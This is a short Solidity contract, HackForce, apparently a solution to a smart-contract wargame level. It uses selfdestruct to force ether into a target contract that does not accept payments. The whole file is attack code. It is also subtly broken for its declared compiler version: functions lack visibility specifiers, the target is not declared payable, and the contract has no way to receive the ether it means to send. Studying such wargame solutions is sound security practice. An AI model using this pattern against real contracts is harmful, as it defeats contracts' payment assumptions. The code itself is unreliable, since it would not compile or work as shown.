// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackForce {
  address public forceAddress;

  constructor(address _forceAddress){
    forceAddress = _forceAddress;
  }

  function forceSend() {
    selfdestruct(forceAddress);
  }
}
